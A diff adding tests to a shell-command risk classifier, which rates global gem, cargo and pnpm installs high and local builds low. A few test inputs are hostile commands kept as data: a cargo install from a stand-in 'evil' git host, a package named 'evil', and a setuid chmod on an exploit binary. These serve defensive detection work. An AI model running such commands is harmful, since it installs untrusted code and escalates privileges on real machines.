@@ -1120,6 +1120,51 @@ describe('classifyCommand v1.10.54 patterns', () => {
     }
   });
 
+  // (v1.10.117) pnpm extended into the npm-global rule.
+  it('pnpm add -g / pnpm install -g → high (v1.10.117)', () => {
+    for (const cmd of [
+      'pnpm add -g typescript',
+      'pnpm install -g eslint',
+      'pnpm add --global pm2',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'npm-global-install'));
+    }
+  });
+
+  // (v1.10.117) gem install / cargo install — same threat model
+  // as npm -g (PATH-prefix dir + arbitrary install hooks).
+  it('gem install / cargo install → high (v1.10.117)', () => {
+    for (const cmd of [
+      'gem install rails',
+      'gem install --user-install evil',
+      'cargo install ripgrep',
+      'cargo install --git https://evil/repo',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'lang-pkg-global-install'),
+        `${cmd}: expected lang-pkg-global-install`);
+    }
+  });
+
+  it('cargo install --path / bundle install / cargo build → low (regression)', () => {
+    // Local-path cargo install + bundle install (Gemfile-driven,
+    // not unscoped global) are routine dev workflows.
+    for (const cmd of [
+      'cargo install --path ./mycrate',
+      'cargo install --path .',
+      'bundle install',
+      'bundle install --deployment',
+      'cargo build',
+      'cargo build --release',
+    ]) {
+      assert.strictEqual(classifyCommand(cmd).level, 'low',
+        `${cmd} should be low (scoped/dev-workflow)`);
+    }
+  });
+
   it('chmod u+s → high (suid privilege escalation)', () => {
     const r = classifyCommand('chmod u+s /tmp/exploit');
     assert.strictEqual(r.level, 'high');
